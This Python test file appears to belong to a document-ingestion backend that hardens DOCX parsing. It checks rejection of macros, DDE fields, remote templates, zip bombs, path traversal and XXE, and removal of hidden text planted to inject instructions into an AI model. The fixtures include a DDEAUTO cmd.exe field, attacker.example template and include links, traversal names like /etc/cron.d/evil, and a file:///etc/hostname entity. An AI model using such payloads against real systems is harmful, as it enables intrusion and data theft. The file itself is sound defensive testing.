"""Security tests for reading untrusted DOCX files: the pre-scan, limits, hidden-text removal and the
sandboxed child process. Fixtures are built here as raw OOXML; none is a working exploit (the "macro" is a
few zero bytes, the "DDE command" is never run).

    cd backend && .venv/bin/python -m unittest tests.test_secure_docx -v
"""
import io
import os
import subprocess
import unittest
import zipfile
from unittest.mock import patch

from ingestion import IngestionError, ingest_bytes, secure_docx
from ingestion.docx import read_part
from ingestion.secure import child_environment, parse_docx_sandboxed
from ingestion.secure_docx import check_docx, parse_docx_checked
from tests.test_ingestion import NS, STYLES, cell, make_docx, para, run, table

REL_BASE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def relationships(*items):
    return ('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            + "".join(items) + "</Relationships>")


def external(kind, target="http://attacker.example/resource", number=1):
    return f'<Relationship Id="rId{number}" Type="{REL_BASE}{kind}" Target="{target}" TargetMode="External"/>'


def docx_with(*, extra=None, body=None):
    return make_docx(body if body is not None else para("Quarterly summary for the review board."), extra=extra)


def macro_docx():
    return docx_with(extra={"word/vbaProject.bin": b"\x00" * 16})


def with_entries(data, entries, compression=zipfile.ZIP_DEFLATED):
    """The zip in `data` plus extra entries, recompressed so size ratios are realistic."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(data)) as source, zipfile.ZipFile(buffer, "w", compression) as target:
        for info in source.infolist():
            target.writestr(info.filename, source.read(info.filename))
        for name, content in entries.items():
            target.writestr(name, content)
    return buffer.getvalue()


def field(instruction, *, split=False):
    """A complex field; `split` spreads the instruction over two text elements the way Word sometimes does."""
    parts = [instruction[:2], instruction[2:]] if split else [instruction]
    instr = "".join(f'<w:r><w:instrText xml:space="preserve">{part}</w:instrText></w:r>' for part in parts)
    return ('<w:r><w:fldChar w:fldCharType="begin"/></w:r>' + instr + '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
            + run("result") + '<w:r><w:fldChar w:fldCharType="end"/></w:r>')


def texts(doc):
    return "\n".join(block.text for block in doc.blocks)


class PreScanTests(unittest.TestCase):
    def test_a_clean_document_has_no_findings_and_parses(self):
        data = docx_with()
        self.assertEqual(check_docx(data), [])
        self.assertIn("Quarterly summary", texts(parse_docx_checked(data, "clean.docx")))

    def test_macros_embedded_objects_and_activex_are_rejected(self):
        cases = {
            "word/vbaProject.bin": "VBA macro project",
            "word/embeddings/oleObject1.bin": "embedded objects",
            "word/activeX/activeX1.xml": "ActiveX",
        }
        for part, meaning in cases.items():
            with self.subTest(part=part), self.assertRaisesRegex(IngestionError, meaning):
                parse_docx_checked(docx_with(extra={part: b"\x00"}), "bad.docx")

    def test_a_macro_enabled_content_type_is_rejected_even_under_a_docx_name(self):
        types = ('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override '
                 'PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
        with self.assertRaisesRegex(IngestionError, "macro-enabled"):
            parse_docx_checked(docx_with(extra={"[Content_Types].xml": types}), "renamed.docx")

    def test_remote_templates_and_linked_objects_are_rejected(self):
        for kind, meaning in (("attachedTemplate", "remote template"), ("oleObject", "linked object"), ("frame", "external frame")):
            with self.subTest(kind=kind), self.assertRaisesRegex(IngestionError, meaning):
                parse_docx_checked(docx_with(extra={"word/_rels/settings.xml.rels": relationships(external(kind))}), "x.docx")

    def test_ordinary_links_and_remote_images_are_accepted_with_a_note_and_never_fetched(self):
        data = docx_with(extra={"word/_rels/document.xml.rels": relationships(
            external("hyperlink", number=1), external("hyperlink", number=2), external("image", number=3))})

        severities = {f.name: f.severity for f in check_docx(data)}
        doc = parse_docx_checked(data, "links.docx")

        self.assertEqual(severities, {"external:hyperlink": "info", "external:image": "medium"})
        self.assertTrue(any("2 external link(s); none were followed" in w for w in doc.warnings))
        self.assertTrue(any("externally hosted image" in w for w in doc.warnings))

    def test_internal_relationships_are_not_findings(self):
        internal = f'<Relationship Id="rId1" Type="{REL_BASE}styles" Target="styles.xml"/>'
        self.assertEqual(check_docx(docx_with(extra={"word/_rels/document.xml.rels": relationships(internal)})), [])

    def test_dde_and_macro_button_fields_are_rejected_including_split_ones(self):
        command = ' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" '
        cases = {
            "dde": para(raw=field(command)),
            "dde split across text elements": para(raw=field(command, split=True)),
            "simple field": para(raw=f'<w:fldSimple w:instr=" DDEAUTO calc ">{run("x")}</w:fldSimple>'),
            "macrobutton": para(raw=field(" MACROBUTTON RunIt Click here")),
        }
        for label, body in cases.items():
            with self.subTest(label), self.assertRaisesRegex(IngestionError, "DDE field|macro button"):
                parse_docx_checked(docx_with(body=body), "field.docx")

    def test_include_fields_warn_and_hyperlink_fields_are_not_flagged(self):
        data = docx_with(body=para(raw=field(' INCLUDETEXT "http://attacker.example/x.docx" ')
                                   + field(' HYPERLINK "http://example.com/LINK" ')))

        self.assertEqual([(f.name, f.severity) for f in check_docx(data)], [("field:INCLUDETEXT", "medium")])
        self.assertTrue(any("pulls in another file" in w for w in parse_docx_checked(data, "x.docx").warnings))

    def test_the_warn_policy_accepts_risky_files_but_says_so(self):
        with patch.dict(os.environ, {"INGEST_DOCX_POLICY": "warn"}):
            doc = parse_docx_checked(macro_docx(), "macro.docx")
        self.assertIn("Quarterly summary", texts(doc))
        self.assertTrue(any("VBA macro project" in w and "'warn'" in w for w in doc.warnings))

    def test_the_file_must_really_be_a_docx_whatever_its_name(self):
        with self.assertRaisesRegex(IngestionError, "legacy Word file or a password-protected"):
            check_docx(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64)
        for fake in (b"MZ\x90\x00 an executable", b"%PDF-1.7 a pdf", b""):
            with self.assertRaisesRegex(IngestionError, "not a .docx"):
                check_docx(fake)
        with self.assertRaisesRegex(IngestionError, "damaged zip"):
            check_docx(b"PK\x03\x04 not really a zip archive")
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as z:
            z.writestr("hello.txt", "x")
        with self.assertRaisesRegex(IngestionError, "word/document.xml is missing"):
            check_docx(buffer.getvalue())


class ZipAbuseTests(unittest.TestCase):
    def test_a_decompression_bomb_is_rejected_by_its_expansion_ratio(self):
        bomb = with_entries(docx_with(), {"word/media/blob.bin": b"\x00" * (5 * 1024 * 1024)})
        self.assertLess(len(bomb), 100 * 1024)  # a few KB on disk
        with patch.object(secure_docx, "RATIO_MIN_BYTES", 1024 * 1024), self.assertRaisesRegex(IngestionError, "decompression bomb"):
            check_docx(bomb)

    def test_the_total_uncompressed_size_is_capped(self):
        big = with_entries(docx_with(), {"word/media/blob.bin": b"\x00" * (3 * 1024 * 1024)})
        with patch.object(secure_docx, "MAX_UNCOMPRESSED_BYTES", 1024 * 1024), self.assertRaisesRegex(IngestionError, "too much data"):
            check_docx(big)

    def test_the_number_of_entries_is_capped(self):
        many = with_entries(docx_with(), {"word/media/a.bin": b"1", "word/media/b.bin": b"2"})
        with patch.object(secure_docx, "MAX_ENTRIES", 3), self.assertRaisesRegex(IngestionError, "internal files; the limit is 3"):
            check_docx(many)

    def test_entry_names_that_try_to_escape_a_folder_are_rejected(self):
        for name in ("../../evil.txt", "/etc/cron.d/evil", "word/../../evil.txt"):
            with self.subTest(name=name), self.assertRaisesRegex(IngestionError, "escape their folder"):
                parse_docx_checked(with_entries(docx_with(), {name: b"x"}), "traversal.docx")

    def test_reads_are_bounded_by_what_is_actually_decompressed(self):
        data = docx_with()
        with zipfile.ZipFile(io.BytesIO(data)) as archive:
            self.assertGreater(len(read_part(archive, "word/document.xml", 10_000)), 10)
            with self.assertRaisesRegex(IngestionError, "too large"):
                read_part(archive, "word/document.xml", 10)

    def test_external_entities_in_any_scanned_part_are_not_resolved(self):
        evil = ('<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/hostname">]>'
                f"<w:hdr {NS}>{para('&x;')}</w:hdr>")
        data = docx_with(extra={"word/header1.xml": evil})
        self.assertEqual(check_docx(data), [])  # parsed, entity left unresolved, nothing found, nothing read


def with_run(rpr, text="PLANTED INSTRUCTION"):
    return f"<w:r><w:rPr>{rpr}</w:rPr><w:t>{text}</w:t></w:r>"


class HiddenTextTests(unittest.TestCase):
    """Text a reviewer cannot see in Word but an extractor would hand to the model."""

    def read(self, body, styles=STYLES):
        return ingest_bytes("hidden.docx", make_docx(body, styles=styles), sandbox=False)

    def test_text_formatted_as_hidden_is_removed_and_reported(self):
        doc = self.read(para(raw=run("Visible ") + with_run("<w:vanish/>") + run("text.")))

        self.assertEqual([b.text for b in doc.blocks], ["Visible text."])
        (warning,) = doc.warnings
        self.assertIn(f"Removed {len('PLANTED INSTRUCTION')} characters of hidden text", warning)

    def test_white_text_on_a_plain_page_and_tiny_text_are_removed(self):
        doc = self.read(para(raw=run("Visible. ") + with_run('<w:color w:val="FFFFFF"/>', "WHITE")
                             + with_run('<w:sz w:val="2"/>', "TINY") + with_run('<w:sz w:val="22"/>', "Normal.")))
        self.assertEqual([b.text for b in doc.blocks], ["Visible. Normal."])

    def test_hidden_formatting_from_a_style_is_honoured(self):
        styles = STYLES.replace("</w:styles>", '<w:style w:type="character" w:styleId="Secret"><w:name w:val="Secret"/>'
                                '<w:rPr><w:vanish/></w:rPr></w:style></w:styles>')
        doc = self.read(para(raw=run("Visible ") + with_run('<w:rStyle w:val="Secret"/>', "STYLED PLANT") + run("text.")), styles)
        self.assertEqual([b.text for b in doc.blocks], ["Visible text."])

    def test_white_text_that_a_reader_can_see_is_kept(self):
        white = '<w:color w:val="FFFFFF"/>'
        on_run_shading = with_run(white + '<w:shd w:val="clear" w:fill="1F3864"/>', "WHITE ON SHADED RUN")
        highlighted = with_run(white + '<w:highlight w:val="darkBlue"/>', "WHITE ON HIGHLIGHT")
        in_dark_cell = (f'<w:tc><w:tcPr><w:shd w:val="clear" w:fill="1F3864"/></w:tcPr>'
                        f'{para(raw=with_run(white, "WHITE IN DARK CELL"))}</w:tc>')
        body = (para(raw=on_run_shading) + para(raw=highlighted)
                + table([cell("Region"), cell("Sales")], [in_dark_cell, cell("42")]))

        doc = self.read(body)

        for text in ("WHITE ON SHADED RUN", "WHITE ON HIGHLIGHT", "WHITE IN DARK CELL"):
            self.assertIn(text, texts(doc))
        self.assertEqual(doc.warnings, [])

    def test_an_explicit_off_switch_keeps_the_text(self):
        doc = self.read(para(raw=with_run('<w:vanish w:val="0"/>', "STILL VISIBLE")))
        self.assertEqual([b.text for b in doc.blocks], ["STILL VISIBLE"])

    def test_a_coloured_page_background_keeps_white_text(self):
        data = make_docx(para(raw=with_run('<w:color w:val="FFFFFF"/>', "WHITE ON A DARK PAGE")))
        with zipfile.ZipFile(io.BytesIO(data)) as z:
            xml = z.read("word/document.xml").decode().replace("<w:body>", '<w:background w:color="000000"/><w:body>')
        doc = ingest_bytes("dark.docx", _replace_document(data, xml), sandbox=False)
        self.assertIn("WHITE ON A DARK PAGE", texts(doc))


def _replace_document(data, xml):
    buffer = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(data)) as source, zipfile.ZipFile(buffer, "w") as target:
        for info in source.infolist():
            target.writestr(info.filename, xml if info.filename == "word/document.xml" else source.read(info.filename))
    return buffer.getvalue()


class SandboxTests(unittest.TestCase):
    def test_the_sandboxed_result_matches_the_in_process_result(self):
        body = (para("Safety", "Heading1") + para("Take one tablet daily.") + para("alpha", num_level=0)
                + table([cell("Region"), cell("Sales")], [cell("North"), cell("10")]))
        data = docx_with(body=body)

        direct = parse_docx_checked(data, "leaflet.docx")
        sandboxed = parse_docx_sandboxed(data, "leaflet.docx")

        self.assertEqual(sandboxed, direct)
        self.assertEqual([b.kind for b in direct.blocks], ["heading", "paragraph", "list", "table"])

    def test_policy_errors_cross_the_process_boundary_unchanged(self):
        with self.assertRaisesRegex(IngestionError, "VBA macro project"):
            parse_docx_sandboxed(macro_docx(), "macro.docx")
        with self.assertRaisesRegex(IngestionError, "not a .docx"):
            parse_docx_sandboxed(b"definitely not a docx", "bad.docx")

    def test_a_hung_parser_is_killed_at_the_timeout(self):
        with self.assertRaisesRegex(IngestionError, "DOCX timed out"):
            parse_docx_sandboxed(docx_with(), "slow.docx", timeout=0.001)

    def test_the_child_keeps_its_secrets_out_but_inherits_the_docx_policy(self):
        with patch.dict(os.environ, {"AIMATE_TEST_SECRET": "hunter2", "INGEST_DOCX_POLICY": "warn"}):
            environment = child_environment()
        self.assertNotIn("hunter2", " ".join(environment.values()))
        self.assertEqual(environment["INGEST_DOCX_POLICY"], "warn")

    def test_the_inherited_policy_really_reaches_the_child(self):
        with patch.dict(os.environ, {"INGEST_DOCX_POLICY": "warn"}):
            doc = parse_docx_sandboxed(macro_docx(), "macro.docx")
        self.assertTrue(any("'warn'" in w for w in doc.warnings))

    def test_the_sandbox_is_on_by_default_and_can_be_switched_off(self):
        data = docx_with()
        with patch("ingestion.secure.subprocess.run", wraps=subprocess.run) as spawned:
            with patch.dict(os.environ, {"INGEST_DOCX_SANDBOX": "1"}):
                ingest_bytes("a.docx", data)
            self.assertEqual(spawned.call_count, 1)
            with patch.dict(os.environ, {"INGEST_DOCX_SANDBOX": "0"}):
                ingest_bytes("b.docx", data)
            self.assertEqual(spawned.call_count, 1)
            ingest_bytes("c.docx", data, sandbox=True)
            self.assertEqual(spawned.call_count, 2)


if __name__ == "__main__":
    unittest.main()
